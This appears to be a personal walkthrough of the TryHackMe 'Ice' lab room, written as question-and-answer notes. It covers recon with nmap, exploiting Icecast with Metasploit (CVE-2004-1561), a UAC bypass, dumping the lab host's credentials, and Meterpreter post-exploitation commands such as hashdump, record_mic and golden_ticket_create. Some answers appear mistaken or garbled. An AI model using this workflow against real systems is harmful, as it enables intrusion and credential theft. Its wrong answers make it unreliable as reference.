# TryHackMe - Ice

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.229.244
```

## 📌 Task 2: Recon

### 🔍 Nmap Scan

**Using all ports takes forever**
```bash
nmap -sS -p- $IP
```

**Results:**
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:20:c4:25:26:e0 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-22T07:53:10-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-22T12:53:10
|_  start_date: 2025-06-22T12:51:12
```

**Q. What port is MSDRP open on?
A. 3389

**Q. What service did nmap identify as running on port 8000? (First word of this service)
A. Icecast2

```bash
telnet $IP 8000
```

**Q. What does Nmap identify as the hostname of the machine? (All caps for the answer)
A. Dark-PC


## 📌 Task 3: Gain Access

https://www.cvedetails.com/cve/CVE-2004-1561/

**Q. What is the Impact Score for this vulnerability?
A. 6.4


**Q. What is the CVE number for this vulnerability?
A. CVE-2004-1561


**Q. What is the full path (starting with exploit) for the exploitation module?
A. exploit/windows/http/icecast_header

**Q. What is the only required setting which currently is blank?
A. RHOSTS


## 📌 Task 4: Escalate

**Q. What's the name of the shell we have now?
A.meterpreter

**Q. What user was running that Icecast process?
A. (PS) 


**Q. What build of Windows is the system?
A. (sysinfo) 7601

**Q. what is the architecture of the process we're running?
A. x64

**Q. What is the full path (starting with exploit/) for the first returned exploit?
A. exploit/windows/local/bypassuac_eventvwr

```
run post/multi/recon/local_exploit_suggester
```

The first exploit didn't submit. Second one did!


**Q. What is the name of the wrong option?
A. LHOST

**Q. What permission listed allows us to take ownership of files?
A. SeIncreaseWorkingSetPriv

```getprivs
```

**Session 1 Results**
```
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```
**Session 2 Results**
```
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

## 📌 Task 5: Looting


**Q. What is the printer spool servicxs called
A. spoolsv.exe

**Q. What user is listed?
A. NT AUTHORITY\SYSTEM

**Q. Which command allows up to retrieve all credentials?
A. creds_all

**Q. What is Dark's password?
A. Password01

```
creds_all
```

**Results**
```
Username  Domain   LM                       NTLM                     SHA1
--------  ------   --                       ----                     ----
Dark      Dark-PC  e52cac67419a9a22ecb0836  7c4fe5eada682714a036e39  0d082c4b4f2aeafb67fd0ea
                   9099ed302                378362bab                568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```


## 📌 Task 6: Post Exploitation


**Q. What command allows us to dump all of the password hashes stored on the system?
A. hashdump

**Q. what command allows us to watch the remote user's desktop in real time?
A. screenshares

**Q. How about if we wanted to record from a microphone attached to the system?
A. record_mic

**Q. What command allows us to do this? 
A. timestamp

**Q. What command allows us to do this?
A. golden_ticket_create


## 📌 Task 7: Extra Credit


** New room called blaster! Maybe I'll check it out. Not using metasploit is not a big deal, I've done that before **
